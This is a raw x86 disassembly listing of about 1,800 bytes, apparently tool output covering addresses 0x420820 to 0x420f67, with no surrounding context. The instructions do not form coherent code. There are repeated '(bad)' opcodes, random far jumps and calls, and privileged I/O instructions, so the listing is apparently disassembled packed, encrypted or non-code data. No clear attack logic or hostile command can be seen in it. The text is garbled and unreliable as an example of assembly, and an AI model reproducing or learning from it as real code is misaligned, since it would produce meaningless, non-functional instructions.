  420820:	mov    al,0x81
  420822:	xor    eax,DWORD PTR [ebx-0x2eb142db]
  420828:	popa   
  420829:	add    eax,0xf55d7e73
  42082e:	or     eax,0x5fb4eace
  420833:	xchg   ecx,eax
  420834:	mov    ds:0xf521542,eax
  420839:	jl     0x420812
  42083b:	sub    al,0xc1
  42083d:	test   BYTE PTR [ebx+0x228e548f],dl
  420843:	sub    edx,DWORD PTR [ebx-0x5]
  420846:	rcr    DWORD PTR [esp+eax*2-0x10],0xeb
  42084b:	inc    edi
  42084c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084d:	sub    edi,edx
  42084f:	or     eax,0x7a07a2c1
  420854:	cld    
  420855:	int    0xc7
  420857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420858:	ins    DWORD PTR es:[edi],dx
  420859:	std    
  42085a:	imul   ebp,esp,0x8d26f4df
  420860:	mov    ebx,0xb84ffee1
  420865:	sbb    esi,DWORD PTR [ebp+0x75]
  420868:	mov    BYTE PTR [ecx+ebp*2],ch
  42086b:	jnp    0x4207ed
  42086d:	pusha  
  42086e:	mov    esp,0xe2eeccb6
  420873:	into   
  420874:	inc    ebp
  420875:	mov    DWORD PTR [esi+0x498f5aa6],edi
  42087b:	mov    dh,0x81
  42087d:	popa   
  42087e:	call   0xc980ecc3
  420883:	mov    edi,0xfbe02d89
  420888:	push   0xe771594a
  42088d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42088e:	push   ds
  42088f:	clc    
  420890:	mov    al,bh
  420892:	xor    BYTE PTR [edx+0x1dc5148f],al
  420898:	push   ds
  420899:	mov    ecx,0x82d88866
  42089e:	lock cwde 
  4208a0:	push   ebp
  4208a1:	mov    edx,0x99765576
  4208a6:	xchg   esi,eax
  4208a7:	stos   BYTE PTR es:[edi],al
  4208a8:	popf   
  4208a9:	arpl   WORD PTR [eax],dx
  4208ab:	fsubp  st(6),st
  4208ad:	sub    edx,DWORD PTR [ecx+0x6fecb344]
  4208b3:	mov    edx,0x9c0c33
  4208b8:	inc    eax
  4208b9:	loopne 0x420876
  4208bb:	xlat   BYTE PTR ds:[ebx]
  4208bc:	aas    
  4208bd:	imul   DWORD PTR [edi+edi*1]
  4208c0:	or     eax,0x5e2b9e24
  4208c5:	add    edi,DWORD PTR [edx-0x75c89241]
  4208cb:	jae    0x420889
  4208cd:	jb     0x4208e6
  4208cf:	jbe    0x4208f7
  4208d1:	iret   
  4208d2:	iret   
  4208d3:	(bad)  
  4208d4:	shl    DWORD PTR [esi],cl
  4208d6:	loope  0x420885
  4208d8:	enter  0xe459,0x60
  4208dc:	shl    BYTE PTR [ebp+eiz*4-0x28],1
  4208e0:	imul   BYTE PTR [ecx-0x16ca1da8]
  4208e6:	pop    es
  4208e7:	jno    0x4208db
  4208e9:	lds    eax,FWORD PTR [edi+0x4d3730fd]
  4208ef:	xchg   ebp,eax
  4208f0:	sbb    DWORD PTR [ecx],esp
  4208f2:	aas    
  4208f3:	stc    
  4208f4:	cli    
  4208f5:	out    dx,eax
  4208f6:	cmp    DWORD PTR [edi+eax*2+0x1f],eax
  4208fa:	fdiv   st,st(0)
  4208fc:	pop    eax
  4208fd:	and    al,0x18
  4208ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420900:	jg     0x42088d
  420902:	add    ebp,ebx
  420904:	mov    ah,0xf2
  420906:	xchg   esp,eax
  420907:	cwde   
  420908:	mov    ds:0x971a46c3,eax
  42090d:	jns    0x420971
  42090f:	fcmove st,st(2)
  420911:	mov    bl,0xf2
  420913:	cmp    DWORD PTR [edi+0x22902def],ebx
  420919:	test   DWORD PTR [esp+ebx*1],ebx
  42091c:	(bad)  
  42091d:	cmp    ecx,ebx
  42091f:	jne    0x420980
  420921:	outs   dx,BYTE PTR ds:[esi]
  420922:	sub    eax,0xf6e5c567
  420927:	or     bl,cl
  420929:	repnz sbb ecx,eax
  42092c:	into   
  42092d:	ds adc eax,0x85e5766d
  420933:	mov    ds:0x8779ee7f,al
  420938:	stos   DWORD PTR es:[edi],eax
  420939:	add    esi,DWORD PTR [edx]
  42093b:	in     eax,0x8b
  42093d:	outs   dx,DWORD PTR ds:[esi]
  42093e:	jmp    0x6c37:0x36d94686
  420945:	aaa    
  420946:	pop    ss
  420947:	sub    esp,eax
  420949:	loop   0x4209c4
  42094b:	sbb    ebx,ebp
  42094d:	rol    BYTE PTR [edi+0x6d],cl
  420950:	shr    ah,1
  420952:	xor    al,0x8e
  420954:	inc    ebp
  420955:	repz sub BYTE PTR ss:[eax+edx*2],bl
  42095a:	dec    edi
  42095b:	test   eax,0xd2e3f3f4
  420960:	dec    ebx
  420961:	jmp    esp
  420963:	mov    ch,0x66
  420965:	(bad)  
  420966:	cmp    al,0x49
  420968:	shl    DWORD PTR [ecx-0x53],cl
  42096b:	leave  
  42096c:	xor    ah,BYTE PTR [edx+ecx*4]
  42096f:	lock dec ebp
  420971:	enter  0x125,0xf7
  420975:	(bad)  
  420976:	cmp    al,0xba
  420978:	lods   al,BYTE PTR ds:[esi]
  420979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42097a:	pop    eax
  42097b:	mov    eax,ds:0x9bf767f7
  420980:	call   0x7d17:0x4b7378d0
  420987:	and    al,0x51
  420989:	std    
  42098a:	aaa    
  42098b:	daa    
  42098c:	out    dx,al
  42098d:	test   eax,0xf358e7bc
  420992:	call   0xd5d83f4
  420997:	push   ecx
  420998:	ficom  DWORD PTR [ecx-0x36]
  42099b:	and    DWORD PTR fs:[esi-0x50a3d31e],esi
  4209a2:	aaa    
  4209a3:	bound  ecx,QWORD PTR [esi]
  4209a5:	mov    al,0xaa
  4209a7:	dec    edx
  4209a8:	lahf   
  4209a9:	loopne 0x4209af
  4209ab:	ds and cl,dl
  4209ae:	push   eax
  4209af:	pop    ebp
  4209b0:	inc    ebp
  4209b1:	mov    ah,0x30
  4209b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209b4:	jmp    0x365d:0x4166b153
  4209bb:	inc    esi
  4209bc:	das    
  4209bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209be:	in     al,0x9d
  4209c0:	scas   al,BYTE PTR es:[edi]
  4209c1:	push   ss
  4209c2:	fistp  DWORD PTR [esi-0x7ca93bc2]
  4209c8:	pop    edx
  4209c9:	fisub  WORD PTR [ebp+0x5f]
  4209cc:	dec    ebp
  4209cd:	and    BYTE PTR [eax+0x14],bl
  4209d0:	and    BYTE PTR [eax-0x2dcbb682],cl
  4209d6:	popa   
  4209d7:	xchg   ebx,eax
  4209d8:	cmp    al,0x40
  4209da:	call   0x9a7e0c74
  4209df:	das    
  4209e0:	add    BYTE PTR [esi-0x248788fb],al
  4209e6:	inc    ecx
  4209e7:	ficomp WORD PTR ds:0xc43d81f6
  4209ed:	lods   eax,DWORD PTR ds:[esi]
  4209ee:	xchg   edx,eax
  4209ef:	mov    dl,0xe2
  4209f1:	cmp    al,dl
  4209f3:	mov    bh,0x6
  4209f5:	(bad)  
  4209f6:	mov    bl,0xfd
  4209f8:	adc    ah,ch
  4209fa:	push   0x66548fdb
  4209ff:	lds    esp,FWORD PTR [edi-0x27cd1f1d]
  420a05:	dec    DWORD PTR ds:0xea1b8fc0
  420a0b:	or     ebx,DWORD PTR [esi+0x5df24042]
  420a11:	lods   eax,DWORD PTR ds:[esi]
  420a12:	stos   DWORD PTR es:[edi],eax
  420a13:	imul   eax,DWORD PTR [edx+esi*1],0x35
  420a17:	jge    0x4209ec
  420a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a1a:	dec    eax
  420a1b:	fsubr  st(1),st
  420a1d:	fld    st(2)
  420a1f:	mov    bl,0x1a
  420a21:	pusha  
  420a22:	icebp  
  420a23:	sbb    al,dl
  420a25:	pop    ss
  420a26:	mov    al,0x77
  420a28:	in     al,dx
  420a29:	clc    
  420a2a:	add    bh,al
  420a2c:	jne    0x420a2e
  420a2e:	and    al,0x2b
  420a30:	xchg   esp,eax
  420a31:	sti    
  420a32:	shl    BYTE PTR [ebx],cl
  420a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a35:	cmp    bl,ch
  420a37:	jmp    0xebac:0xce325ee
  420a3e:	pop    edx
  420a3f:	cmp    ch,cl
  420a41:	dec    ecx
  420a42:	ins    BYTE PTR es:[edi],dx
  420a43:	shl    DWORD PTR [edx-0x5b],cl
  420a46:	cld    
  420a47:	inc    ebx
  420a48:	push   ds
  420a49:	das    
  420a4a:	jmp    0xc15d:0x3eeb654a
  420a51:	lahf   
  420a52:	dec    ebx
  420a53:	pop    ebp
  420a54:	mov    ds:0x86461cd1,al
  420a59:	add    edi,DWORD PTR [edi+0x446d161e]
  420a5f:	inc    edx
  420a60:	rcl    DWORD PTR [ecx],0x7b
  420a63:	dec    ebx
  420a64:	les    esi,FWORD PTR [edx]
  420a66:	pop    ss
  420a67:	scas   al,BYTE PTR es:[edi]
  420a68:	shl    DWORD PTR [esi-0x75],cl
  420a6b:	push   ss
  420a6c:	cwde   
  420a6d:	mov    bl,0x9a
  420a6f:	mov    dl,0xd7
  420a71:	adc    DWORD PTR [ecx],edx
  420a73:	xor    bh,BYTE PTR [edx+0x3c0cb2b4]
  420a79:	das    
  420a7a:	inc    edx
  420a7b:	sub    eax,0xebf5fb08
  420a80:	dec    esi
  420a81:	sub    al,0xd7
  420a83:	push   ebp
  420a84:	xor    DWORD PTR [edi-0x7b78f5e0],esi
  420a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a8b:	mov    gs,WORD PTR [ecx]
  420a8d:	push   0xa9cfae5f
  420a92:	stos   DWORD PTR es:[edi],eax
  420a93:	push   edi
  420a94:	int    0x78
  420a96:	(bad)  
  420a97:	xchg   edi,eax
  420a98:	xchg   edi,eax
  420a99:	or     bh,bh
  420a9b:	mov    esp,0x8748122f
  420aa0:	jmp    0x420b20
  420aa2:	jmp    0x5d0c:0xf3e551ae
  420aa9:	call   FWORD PTR [esi]
  420aab:	retf   
  420aac:	je     0x420aae
  420aae:	jb     0x420b01
  420ab0:	pop    edi
  420ab1:	jne    0x420a8f
  420ab3:	jns    0x420b0d
  420ab5:	bound  eax,QWORD PTR [ebx]
  420ab7:	push   ds
  420ab8:	ds in  eax,dx
  420aba:	xor    DWORD PTR [edx-0x41],0xcd1c328e
  420ac1:	inc    ebx
  420ac2:	and    al,0xc4
  420ac4:	cwde   
  420ac5:	loop   0x420a6c
  420ac7:	push   0x123e5da1
  420acc:	xchg   edi,eax
  420acd:	daa    
  420ace:	mov    bh,0xbf
  420ad0:	int    0x66
  420ad2:	dec    edi
  420ad3:	push   es
  420ad4:	cmp    bh,BYTE PTR [ebx]
  420ad6:	sbb    al,0xa7
  420ad8:	stos   BYTE PTR es:[edi],al
  420ad9:	(bad)  
  420ada:	xlat   BYTE PTR ds:[ebx]
  420adb:	cdq    
  420adc:	fwait
  420add:	rol    DWORD PTR [ebp-0x74],1
  420ae0:	fs jmp 0x420a8c
  420ae3:	imul   ebx,esp,0x21fab7c0
  420ae9:	(bad)
  420aed:	repnz int 0x5d
  420af0:	mov    edi,0xb7d7d66a
  420af5:	sti    
  420af6:	rcr    DWORD PTR [ebx],cl
  420af8:	psllw  mm1,QWORD PTR [esi-0x33]
  420afc:	imul   esp,DWORD PTR [eax-0x56cb30b5],0xffffffd2
  420b03:	dec    ebx
  420b04:	and    ebp,DWORD PTR [ebx+0x74]
  420b07:	mov    edx,0xbe2d95fe
  420b0c:	mov    fs,WORD PTR [esi-0x3f]
  420b0f:	dec    edx
  420b10:	test   ebp,eax
  420b12:	mov    cl,0xba
  420b14:	aad    0xd9
  420b16:	bound  ecx,QWORD PTR [ecx+0x7]
  420b19:	lods   eax,DWORD PTR ds:[esi]
  420b1a:	pop    esp
  420b1b:	mov    bl,0x30
  420b1d:	int    0x8
  420b1f:	xor    eax,0x72ada3f6
  420b24:	dec    esp
  420b25:	enter  0x2d9f,0x21
  420b29:	retf   0xd5c7
  420b2c:	test   eax,0x2a7f71a7
  420b31:	xchg   edx,esi
  420b33:	ret    
  420b34:	dec    edx
  420b35:	fisttp WORD PTR [eax+0x18]
  420b38:	idiv   BYTE PTR [esi+0x3b6e78ed]
  420b3e:	into   
  420b3f:	mov    al,BYTE PTR ds:0xaf01796a
  420b45:	cmp    al,0xb4
  420b47:	adc    al,0x8a
  420b49:	pop    ss
  420b4a:	xchg   ecx,eax
  420b4c:	pop    es
  420b4d:	xchg   ebx,eax
  420b4e:	repnz and DWORD PTR [edi],eax
  420b51:	out    0x26,eax
  420b53:	ror    esp,cl
  420b55:	fstp   DWORD PTR [ebp-0x3c]
  420b58:	retf   
  420b59:	lods   al,BYTE PTR ds:[esi]
  420b5a:	pop    ss
  420b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b5c:	je     0x420bbd
  420b5e:	xor    ebx,DWORD PTR [ebx+0x40]
  420b61:	and    ebx,DWORD PTR [esi]
  420b63:	xchg   BYTE PTR [ebx-0x482595d7],bh
  420b69:	popa   
  420b6a:	shr    BYTE PTR [esi+ecx*2+0x65cb10cf],0xf0
  420b72:	pushf  
  420b73:	xor    DWORD PTR [edi+0x4bfd9a83],edi
  420b79:	punpckhbw mm3,QWORD PTR [ecx]
  420b7c:	(bad)  
  420b7e:	repz pushf 
  420b80:	adc    DWORD PTR [eax+0x1e],ecx
  420b83:	jle    0x420bdd
  420b85:	mov    ch,0x48
  420b87:	ret    
  420b88:	mov    cl,0x41
  420b8a:	pusha  
  420b8b:	iret   
  420b8c:	jb     0x420b18
  420b8e:	aas    
  420b8f:	jp     0x420bb8
  420b91:	and    eax,0x599d8f75
  420b96:	mov    ds:0xf6ebc305,al
  420b9b:	shl    BYTE PTR ds:0x19cda1f9,0x66
  420ba2:	adc    al,0x78
  420ba4:	scas   eax,DWORD PTR es:[edi]
  420ba5:	fistp  DWORD PTR ds:0xba6f0901
  420bab:	inc    ecx
  420bac:	lock cmp al,0xf0
  420baf:	adc    DWORD PTR [eax-0x3d],0x217a5309
  420bb6:	push   ds
  420bb7:	repnz xor DWORD PTR [ebx-0x75c9d230],edi
  420bbe:	pusha  
  420bbf:	inc    ebx
  420bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bc1:	dec    ebx
  420bc2:	push   ebp
  420bc3:	jno    0x420b57
  420bc5:	fmul   QWORD PTR [edx]
  420bc7:	pop    esi
  420bc8:	mov    WORD PTR [ebp-0x4e46b76d],ss
  420bce:	xor    al,0x84
  420bd0:	inc    edx
  420bd1:	rol    DWORD PTR [ebx+0x4ae21d15],0x32
  420bd8:	and    al,0xfa
  420bda:	add    eax,0x635f6295
  420bdf:	mov    bl,0x18
  420be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420be2:	sahf   
  420be3:	xchg   ebx,eax
  420be4:	(bad)  
  420be5:	fisub  WORD PTR [edx+0x57]
  420be8:	dec    ebx
  420be9:	ins    BYTE PTR es:[edi],dx
  420bea:	or     esi,DWORD PTR [ebp-0x19]
  420bed:	inc    eax
  420bee:	pop    eax
  420bef:	jo     0x420be8
  420bf1:	gs push es
  420bf3:	push   edi
  420bf4:	mov    ch,0x57
  420bf6:	adc    BYTE PTR [edi+0x70f64886],ah
  420bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bfd:	jecxz  0x420c3d
  420bff:	xchg   ebx,eax
  420c00:	gs pop eax
  420c02:	mov    fs,WORD PTR [ebx+0x6ad0dc5]
  420c08:	mov    eax,DWORD PTR [ebx-0x72]
  420c0b:	ins    DWORD PTR es:[edi],dx
  420c0c:	and    esi,ebx
  420c0e:	sbb    DWORD PTR [esi],0x7e
  420c11:	call   0x797f:0x8db38413
  420c18:	pop    esp
  420c19:	dec    ecx
  420c1a:	xchg   edi,eax
  420c1b:	mov    ch,0x3d
  420c1d:	add    dh,BYTE PTR ds:0xda5d30e5
  420c23:	xor    DWORD PTR [eax-0x33],esi
  420c26:	jnp    0x420c0c
  420c28:	push   esp
  420c29:	mov    ds:0xc9debb77,al
  420c2e:	xchg   esi,eax
  420c2f:	mov    ah,0x30
  420c31:	xor    esp,DWORD PTR [ecx+0x2b18956e]
  420c37:	adc    bh,BYTE PTR [esi+0x5f]
  420c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c3c:	cmp    edi,esi
  420c3e:	adc    al,0x98
  420c40:	outs   dx,DWORD PTR ds:[esi]
  420c41:	je     0x420c68
  420c43:	mov    edi,0x3011b764
  420c48:	fsincos 
  420c4a:	outs   dx,DWORD PTR ds:[esi]
  420c4b:	sbb    DWORD PTR [edi],edi
  420c4d:	xchg   edi,eax
  420c4e:	pop    ebx
  420c4f:	js     0x420c4d
  420c51:	mov    edx,0x879e54ad
  420c56:	popa   
  420c57:	or     al,BYTE PTR [ecx+0x2b]
  420c5a:	call   0x1dbc:0xe1b892c
  420c61:	in     eax,dx
  420c62:	jno    0x420bf8
  420c64:	pushf  
  420c65:	adc    dl,BYTE PTR [edx+ebx*4-0x5a]
  420c69:	pop    ecx
  420c6a:	retf   0x515b
  420c6d:	add    eax,0xe8275480
  420c72:	stc    
  420c73:	lds    ebx,FWORD PTR [ecx+ebp*2+0x23683d1e]
  420c7a:	xor    edi,DWORD PTR [edi+ecx*8-0x5a8f4ca3]
  420c81:	div    ebp
  420c83:	sbb    DWORD PTR [edx],esp
  420c85:	sub    cl,dh
  420c87:	push   ebx
  420c88:	mov    DWORD PTR gs:[edx-0x53],ebx
  420c8c:	xchg   DWORD PTR [eax],eax
  420c8e:	jns    0x420c91
  420c90:	scas   eax,DWORD PTR es:[edi]
  420c91:	call   0x4b68:0xb54d5c76
  420c98:	repz sbb esi,DWORD PTR [ebp-0x5c]
  420c9c:	fisubr DWORD PTR [eax+0x1c]
  420c9f:	cmp    al,0x58
  420ca1:	(bad)  
  420ca2:	sbb    ebp,DWORD PTR [edx-0x3cd2ae3e]
  420ca8:	mov    dh,0x26
  420caa:	cdq    
  420cab:	fld    QWORD PTR [ebx+ecx*1]
  420cae:	mov    eax,0xc61f24d8
  420cb3:	sbb    edi,ebx
  420cb5:	sub    DWORD PTR [edi-0x5e],ebp
  420cb8:	sbb    esi,DWORD PTR [eax-0x5f]
  420cbb:	push   edi
  420cbc:	aad    0xec
  420cbe:	dec    esi
  420cbf:	das    
  420cc0:	or     BYTE PTR [esi-0x80],bl
  420cc3:	cli    
  420cc4:	cmp    DWORD PTR [edx],edi
  420cc6:	cmp    ebp,DWORD PTR [edi]
  420cc8:	lods   eax,DWORD PTR ds:[esi]
  420cc9:	gs aad 0x8d
  420ccc:	adc    BYTE PTR [ebx],al
  420cce:	sub    DWORD PTR [ebx+edx*4],ebx
  420cd1:	not    ch
  420cd3:	pop    esi
  420cd4:	add    al,BYTE PTR [esi]
  420cd6:	mov    BYTE PTR [esi],bl
  420cd8:	sub    al,BYTE PTR [edx-0x2f135f7e]
  420cde:	jl     0x420d1c
  420ce0:	data16 loopne 0x420ccc
  420ce3:	dec    ebx
  420ce4:	ins    BYTE PTR es:[edi],dx
  420ce5:	packsswb mm7,mm0
  420ce8:	clc    
  420ce9:	or     BYTE PTR [ebp+0x45],cl
  420cec:	es xchg ecx,eax
  420cee:	xchg   ecx,eax
  420cef:	xor    al,0x27
  420cf1:	jle    0x420ce0
  420cf3:	add    eax,0xf393dc85
  420cf8:	cmp    BYTE PTR [esi+eax*8-0x5b],dh
  420cfc:	sti    
  420cfd:	xor    cl,BYTE PTR [edx+0x54133cfb]
  420d03:	retf   
  420d04:	adc    BYTE PTR [esi+0x4e],dl
  420d07:	and    eax,0x40ede0cc
  420d0c:	jno    0x420ccb
  420d0e:	dec    esi
  420d0f:	push   cs
  420d10:	addr16 inc ecx
  420d12:	loop   0x420d38
  420d14:	mov    al,ds:0x2f4400d7
  420d19:	mov    al,0x2b
  420d1b:	or     edx,esi
  420d1d:	ja     0x420d12
  420d1f:	test   DWORD PTR [esi],edi
  420d21:	jae    0x420d13
  420d23:	mov    DWORD PTR [ebx+0x72],esp
  420d26:	cmp    DWORD PTR [esi-0x75],ebx
  420d29:	enter  0x52f7,0xc2
  420d2d:	not    BYTE PTR [edi-0x58]
  420d30:	scas   eax,DWORD PTR es:[edi]
  420d31:	ficom  WORD PTR [edx]
  420d33:	push   esp
  420d34:	test   DWORD PTR ds:0x8f6becf8,edx
  420d3a:	cwde   
  420d3b:	ins    DWORD PTR es:[edi],dx
  420d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d3d:	ja     0x420d2b
  420d3f:	xchg   ecx,eax
  420d40:	fild   DWORD PTR [ebx]
  420d42:	sub    eax,0xb8785c39
  420d47:	jbe    0x420dbe
  420d49:	sti    
  420d4a:	retf   0x1c82
  420d4d:	ja     0x420d2b
  420d4f:	loop   0x420d5b
  420d51:	rcl    BYTE PTR [ebp-0x77],0xb8
  420d55:	adc    al,0x97
  420d57:	xchg   ebp,eax
  420d58:	mov    al,0xbb
  420d5a:	push   eax
  420d5b:	pusha  
  420d5c:	ss je  0x420d70
  420d5f:	aaa    
  420d60:	es out 0x56,eax
  420d63:	push   cs
  420d64:	mov    ecx,0x4d739d25
  420d69:	jae    0x420cfc
  420d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d6c:	into   
  420d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d6e:	fdiv   st(7),st
  420d70:	iret   
  420d71:	cli    
  420d72:	popf   
  420d73:	xchg   esi,eax
  420d74:	int    0xd8
  420d76:	ret    0x779
  420d79:	push   cs
  420d7a:	sbb    eax,0x4c1b7d4
  420d7f:	(bad)  
  420d80:	cmp    eax,0xab40e54a
  420d85:	inc    esi
  420d86:	(bad)  
  420d87:	sub    eax,0x177c0573
  420d8c:	pop    ebx
  420d8d:	push   esp
  420d8e:	iret   
  420d8f:	jp     0x420d56
  420d91:	mov    BYTE PTR [ebx+eax*2],al
  420d94:	pusha  
  420d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d96:	inc    edx
  420d97:	mov    al,ds:0x57349cac
  420d9c:	pop    es
  420d9d:	cmp    edi,DWORD PTR [esp+eax*1+0x4222232a]
  420da4:	push   eax
  420da5:	scas   al,BYTE PTR es:[edi]
  420da6:	repz sbb ah,BYTE PTR [ecx+0x60]
  420daa:	pop    eax
  420dab:	adc    al,0x4e
  420dad:	mov    ah,0xc1
  420daf:	sub    esi,esi
  420db1:	push   ecx
  420db2:	mov    eax,0xa3f29731
  420db7:	jp     0x420e30
  420db9:	push   edi
  420dba:	mov    ebp,0x8a799703
  420dbf:	dec    esi
  420dc0:	(bad)  
  420dc1:	(bad)  
  420dc2:	or     eax,0x579335bf
  420dc7:	inc    ecx
  420dc8:	das    
  420dc9:	cmp    cl,BYTE PTR [ebx+0x1d]
  420dcc:	stc    
  420dcd:	or     al,0x2f
  420dcf:	and    eax,0xe3faae48
  420dd4:	iret   
  420dd5:	xchg   ebp,eax
  420dd6:	push   esi
  420dd7:	test   DWORD PTR [esi-0x30fc7eae],ecx
  420ddd:	jns    0x420d94
  420ddf:	jo     0x420dac
  420de1:	aas    
  420de2:	and    ah,BYTE PTR [ebx+0x2]
  420de5:	jmp    0xdad0:0x641e460e
  420dec:	std    
  420ded:	mov    ds:0xd8c0ea4d,al
  420df2:	jns    0x420e09
  420df4:	jno    0x420e17
  420df6:	cdq    
  420df7:	add    al,BYTE PTR [ecx]
  420df9:	adc    eax,0xffe39755
  420dfe:	fdiv   DWORD PTR [eax]
  420e00:	mov    esi,0x82e979f9
  420e05:	stos   BYTE PTR es:[edi],al
  420e06:	(bad)  
  420e07:	scas   al,BYTE PTR es:[edi]
  420e08:	std    
  420e09:	xchg   esp,eax
  420e0a:	xor    DWORD PTR [ebx],esi
  420e0c:	imul   esp,DWORD PTR [ecx+eax*2],0x3b
  420e10:	cmp    al,0xf0
  420e12:	ins    BYTE PTR es:[edi],dx
  420e13:	dec    ebx
  420e14:	push   ebp
  420e15:	adc    al,BYTE PTR [edi-0xa]
  420e18:	and    BYTE PTR ds:0x84ca237c,dl
  420e1e:	inc    esp
  420e1f:	cld    
  420e20:	xchg   eax,ecx
  420e22:	inc    ebp
  420e23:	fimul  DWORD PTR [ebp+0x4e]
  420e26:	mov    ch,0x63
  420e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e29:	int3   
  420e2a:	call   0x148a:0x732f766b
  420e31:	mov    DWORD PTR [eax-0x5],ebx
  420e34:	jmp    0x420e6a
  420e36:	adc    BYTE PTR [ebp+0x23],dh
  420e39:	stos   DWORD PTR es:[edi],eax
  420e3a:	jp     0x420e97
  420e3c:	call   0x8b7bcdce
  420e41:	imul   edx,ebp,0xe5647ae7
  420e47:	dec    esi
  420e48:	adc    DWORD PTR [esi*8+0x40f498f0],esp
  420e4f:	and    dl,bh
  420e51:	imul   ebp,DWORD PTR [edi-0x55],0x1e
  420e55:	out    dx,al
  420e56:	inc    edi
  420e57:	inc    ebp
  420e58:	cmc    
  420e59:	imul   DWORD PTR [esi+0x78f4136e]
  420e5f:	jl     0x420ece
  420e61:	and    eax,0xcd71f7ab
  420e67:	cmp    eax,0xb21fe520
  420e6c:	pushf  
  420e6d:	or     cl,bl
  420e6f:	mov    edx,0x3768fd8c
  420e74:	scas   al,BYTE PTR es:[edi]
  420e75:	ins    DWORD PTR es:[edi],dx
  420e76:	xor    dh,dh
  420e78:	push   edi
  420e79:	add    edx,DWORD PTR [ecx+ebx*2]
  420e7c:	mov    ch,0xb8
  420e7e:	aaa    
  420e7f:	adc    eax,0xb1d60c16
  420e84:	out    0x5d,al
  420e86:	sbb    DWORD PTR [ebp+eax*4-0x4707c50f],edi
  420e8d:	xor    eax,0xcea9407a
  420e92:	mov    DWORD PTR [esi+0x1e],0xe2213c4b
  420e99:	inc    ebx
  420e9a:	xchg   ecx,eax
  420e9b:	ret    
  420e9c:	pop    edi
  420e9d:	jae    0x420e69
  420e9f:	mov    DWORD PTR [ebx+ebp*4],ecx
  420ea2:	adc    al,0xe6
  420ea4:	aas    
  420ea5:	xchg   ecx,eax
  420ea6:	mov    dh,0x7a
  420ea8:	mov    ebp,0xb7b3bd7
  420ead:	mov    WORD PTR [edx],?
  420eaf:	mov    ebp,0xa143b161
  420eb4:	popa   
  420eb5:	in     eax,dx
  420eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eb7:	xchg   edx,eax
  420eb8:	sub    DWORD PTR ds:[ecx-0x25],esi
  420ebc:	adc    DWORD PTR [esi],edi
  420ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebf:	and    eax,0x402b8de4
  420ec4:	jg     0x420ebf
  420ec6:	pop    eax
  420ec8:	bnd ret 
  420eca:	push   ecx
  420ecb:	jg     0x420eca
  420ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ece:	jb     0x420ed1
  420ed0:	add    al,0x34
  420ed2:	jmp    0x7a8d2c45
  420ed7:	cmp    BYTE PTR [ebx-0x5f],bl
  420eda:	sub    eax,0xcbda4c46
  420edf:	ins    BYTE PTR es:[edi],dx
  420ee0:	xchg   ebx,eax
  420ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee2:	in     eax,0xc8
  420ee4:	cli    
  420ee5:	imul   eax,edi,0xffffffd8
  420ee8:	fwait
  420ee9:	dec    ebx
  420eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eeb:	jle    0x420eed
  420eed:	stc    
  420eee:	addr16 push edi
  420ef0:	pop    esp
  420ef1:	sub    DWORD PTR [esi-0x18e934ac],edx
  420ef7:	dec    edx
  420ef8:	sub    eax,0x879e936e
  420efd:	push   es
  420efe:	cs jbe 0x420e82
  420f01:	fild   WORD PTR ds:0x938a4df9
  420f07:	rcr    BYTE PTR [ebp-0x69],cl
  420f0a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f0d:	rol    cl,cl
  420f0f:	(bad)  
  420f10:	icebp  
  420f11:	lea    eax,[edx-0x7d]
  420f14:	push   0x8
  420f16:	daa    
  420f17:	add    al,bl
  420f19:	int3   
  420f1a:	test   al,0x51
  420f1c:	dec    edi
  420f1d:	cdq    
  420f1e:	cdq    
  420f1f:	sub    al,0xd4
  420f21:	(bad)  
  420f22:	fdivr  DWORD PTR [esi-0x65]
  420f25:	outs   dx,BYTE PTR ds:[esi]
  420f26:	lock das 
  420f28:	ret    0x50ca
  420f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f2c:	mov    ds:0x25de0a4d,eax
  420f31:	inc    ebx
  420f32:	sub    BYTE PTR [edi],cl
  420f34:	sbb    ebx,DWORD PTR [edx+0x1164c051]
  420f3a:	cmp    esp,eax
  420f3c:	or     eax,0xcf5a7893
  420f41:	unpckhps xmm0,xmm2
  420f44:	frstor cs:[ecx]
  420f47:	pop    ecx
  420f48:	mov    DWORD PTR [eax-0x781ef556],edx
  420f4e:	jno    0x420f3d
  420f50:	out    dx,al
  420f51:	cmp    al,0x7d
  420f53:	leave  
  420f54:	rcl    bl,cl
  420f56:	test   BYTE PTR [bx+0x1a1a],cl
  420f5b:	pusha  
  420f5c:	cld    
  420f5d:	shl    BYTE PTR [ecx+0x78],0x61
  420f61:	pop    esp
  420f62:	xlat   BYTE PTR ds:[ebx]
  420f63:	push   esi
  420f64:	dec    esi
  420f65:	push   0xfffffff2
  420f67:	cmp    ecx,DWORD PTR [edx+0x69]
